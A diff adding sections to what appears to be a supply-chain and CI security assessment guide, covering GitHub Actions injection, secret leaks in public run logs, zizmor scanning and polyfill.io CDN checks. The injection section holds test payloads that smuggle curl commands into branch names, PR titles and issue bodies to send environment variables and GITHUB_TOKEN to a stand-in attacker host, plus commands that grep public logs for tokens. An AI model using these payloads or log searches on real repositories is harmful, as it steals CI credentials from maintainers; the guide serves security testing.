@@ -226,6 +226,58 @@ done
 | Issue-comment-triggered workflow that runs `gh` with token | **High** |
 | Workflow downloads from URL that target controls | **Medium** |
 
+### GitHub Actions context injection sinks (branch name, PR title, issue body)
+
+Untrusted context flowing from PR metadata into `run:` blocks is a classic injection vector. Test payloads:
+
+```bash
+# Malicious branch name (test in a fork PR):
+git checkout -b 'feat/x"; curl https://attacker/?d=$(env | base64);"'
+git push origin 'feat/x"; curl https://attacker/?d=$(env | base64);"'
+
+# Malicious PR title (create a test PR with this title):
+PR_TITLE='x"; curl https://attacker/?d=$(echo $GITHUB_TOKEN | base64);"'
+
+# Malicious issue body:
+ISSUE_BODY='x"; curl https://attacker/?leak=$(git config user.name);"'
+
+# Then watch workflow logs. If the injected commands execute, secrets are exfil'd.
+```
+
+### Public GitHub Actions run logs (leaks secrets)
+
+Actions logs are public by default on public repos. Look for:
+
+```bash
+# List all Action runs for a repo
+gh api repos/OWNER/REPO/actions/runs --jq '.workflow_runs[] | {id, name, head_branch, status, conclusion}'
+
+# Fetch logs from a run
+gh api repos/OWNER/REPO/actions/runs/<id>/logs --jq '.logs' | base64 -d
+
+# Search logs for common leakage patterns
+gh api repos/OWNER/REPO/actions/runs/<id>/logs | grep -iE 'token|key|secret|password|credential|aws_'
+```
+
+Leaked secrets in logs = direct credential exfil; severity depends on the token type (GitHub PAT, npm token, AWS key, etc.).
+
+### Static detection of Actions injection sinks with zizmor
+
+For high-confidence automated flagging, run the `zizmor` analyzer on all workflow files:
+
+```bash
+# Install zizmor (Rust-based, from https://github.com/woodruffw/zizmor)
+cargo install zizmor
+
+# Scan all workflows
+zizmor .github/workflows/*.yml
+
+# Output includes: pull_request_target, mutable-tag uses, context interpolation, etc.
+# Sort findings by risk tier
+```
+
+Zizmor saves manual regex work and catches edge cases (e.g., indirect context interpolation via variable references).
+
 ---
 
 ## Step 7 — Docker / container image registry mining
@@ -310,6 +362,27 @@ curl -sI "https://registry.npmjs.org/-/org/$ORG"
 
 ---
 
+## Step 11 — Frontend and third-party dependency checks
+
+### Compromised CDN detection (polyfill.io, etc.)
+
+Known-compromised CDNs and analytics services have been weaponized. Check target's public HTML/JS:
+
+```bash
+# Detect usage of polyfill.io and similar historically-compromised services
+curl -s https://target.com | grep -i polyfill
+curl -s https://target.com | grep -iE '(polyfill\.io|cdn\.jsdelivr\.net.*polyfill|babel\.min\.js)'
+
+# Check JavaScript bundles
+for bundle in public/*.js main.*.js app.*.js; do
+  grep -i polyfill "$bundle" && echo "FOUND: $bundle"
+done
+```
+
+Reference: polyfill.io was compromised in 2024 to serve malicious payloads. Presence = supply-chain risk.
+
+---
+
 ## Tooling
 
 | Tool | Purpose |
@@ -320,6 +393,7 @@ curl -sI "https://registry.npmjs.org/-/org/$ORG"
 | **`packj`** | Package risk score (PyPI/npm/RubyGems) |
 | **`Lift / Snyk vuln-db`** | Known CVE lookup by package version |
 | **`actionlint`** | GitHub Actions static analyzer |
+| **`zizmor`** | GitHub Actions injection & security antipattern detection |
 | **`OSSGadget`** | Microsoft's package metadata toolkit |
 | **`semgrep`** + supply-chain rules | Workflow injection detection |
 | **`osv-scanner`** | Match versions to known vulns |
